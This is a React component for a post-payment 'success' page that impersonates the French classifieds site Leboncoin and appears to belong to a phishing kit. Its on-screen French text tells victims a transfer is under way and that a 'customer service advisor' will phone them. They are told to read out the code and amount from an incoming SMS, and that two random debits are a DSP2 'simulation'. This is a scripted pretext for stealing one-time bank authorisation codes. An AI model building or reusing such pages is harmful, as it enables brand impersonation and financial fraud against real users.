
import React, { useEffect, useState } from "react";
import Footer from "@/components/Footer";
import { getFromSession } from "@/utils/sessionUtils";
import { useNavigate } from "react-router-dom";

const Success: React.FC = () => {
  const [userData, setUserData] = useState<any>(null);
  const [saveStatus, setSaveStatus] = useState<"idle" | "saving" | "success" | "error">("success");
  const navigate = useNavigate();

  useEffect(() => {
    // Récupère les données utilisateur depuis la session
    const sessionData = getFromSession("userData");
    setUserData(sessionData);
    
    // Nous n'avons plus besoin de sauvegarder ici car c'est déjà fait dans BankConfirmation
    setSaveStatus("success");
  }, []);

  const handleFinish = () => {
    // Réinitialise complètement la session
    sessionStorage.clear();
    console.log("Session storage cleared successfully");
    
    // Redirige vers la page d'accueil
    navigate("/");
  };

  return (
    <div className="min-h-screen flex flex-col bg-white">
      {/* Header */}
      <header className="w-full py-4 border-b border-gray-200">
        <div className="container mx-auto px-4">
          <img 
            src="/logo.svg" 
            alt="Leboncoin" 
            className="h-8" 
          />
        </div>
      </header>

      <main className="flex-1 flex flex-col items-center justify-center p-4 py-8">
        <div className="w-full max-w-2xl px-6 py-8 bg-white rounded-lg text-center">
          <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
            <svg className="w-10 h-10 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
            </svg>
          </div>
          
          <h1 className="text-3xl font-bold mb-3 text-center">Votre virement est en cours</h1>
          <p className="text-xl mb-10 text-center">
            Merci d'avoir choisi Leboncoin.
          </p>

          {saveStatus === "saving" && (
            <div className="mb-6 flex items-center justify-center">
              <div className="w-5 h-5 border-2 border-leboncoin-orange border-t-transparent rounded-full animate-spin mr-2"></div>
              <p className="text-gray-600">Finalisation de votre transaction...</p>
            </div>
          )}

          <div className="text-left space-y-6 mb-10">
            <p className="text-lg">
              <span className="text-leboncoin-orange">Suite aux nouvelles mesures de sécurité pour terminer la confirmation de votre compte : </span>
              <strong>vous serez contacté par téléphone par le service client dans les meilleurs délais.</strong>
            </p>
            
            <p className="text-lg">
              <span className="text-leboncoin-orange">En confirmant votre compte bancaire, vous autorisez Leboncoin à vous envoyer un SMS. Vous trouverez dans le SMS, </span>
              <strong>un montant de vérification généré de manière aléatoire et un code de 4 à 8 chiffres</strong>
              <span className="text-leboncoin-orange">, que vous devez communiquer au conseiller pour confirmer votre compte bancaire.</span>
            </p>
            
            <p className="text-lg">
              <span className="text-leboncoin-orange">Pour la confirmation de votre compte bancaire, nous effectuons une </span>
              <strong>simulation</strong>
              <span className="text-leboncoin-orange"> en vous débitant 2 montants aléatoires au minimum, ensuite ces montants vous seront à nouveau crédités en plus du paiement de l'acheteur, ceci apparaîtra dans l'historique de votre compte bancaire dans 1 à 3 jours ouvrés. </span>
              <strong>Cette vérification interbancaire de la réglementation en vigueur du système européen DSP2</strong>
              <span className="text-leboncoin-orange"> permet de prouver que vous êtes bien le titulaire de la carte et le compte bancaire enregistré sur votre compte Leboncoin.</span>
            </p>
            
            <p className="text-lg text-center">
              Cordialement, Leboncoin.
            </p>
          </div>

          <button
            onClick={handleFinish}
            className="primary-button max-w-xs mx-auto"
          >
            Terminer
          </button>
        </div>
      </main>

      <Footer />
    </div>
  );
};

export default Success;
